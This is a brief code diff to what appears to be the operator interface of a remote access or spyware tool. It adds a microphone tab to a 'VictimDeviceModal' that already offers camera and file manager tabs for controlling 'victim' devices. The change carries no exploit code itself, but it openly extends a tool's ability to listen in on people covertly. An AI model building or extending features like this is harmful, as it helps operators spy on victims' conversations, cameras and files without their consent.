@@ -28,6 +28,7 @@ import { VictimOrder } from '../../../common/enums';
 import { type VictimDeviceStore } from '../../store/VictimDeviceStore';
 import { CameraTab } from './CameraTab';
 import { FileManagerTab } from './FileManagerTab';
+import { MicrophoneTab } from './MicrophoneTab';
 
 interface IProps {
     data?: VictimDeviceStore;
@@ -120,6 +121,8 @@ export const VictimDeviceModal: React.FC<IProps> = observer((props) => {
                                 <CameraTab data={props.data} />
                             ) : selectedTab === VictimOrder.FILE_MANAGER ? (
                                 <FileManagerTab data={props.data} />
+                            ) : selectedTab === VictimOrder.MICROPHONE ? (
+                                <MicrophoneTab data={props.data} />
                             ) : null)}
                     </DialogContent>
                 </DialogBody>
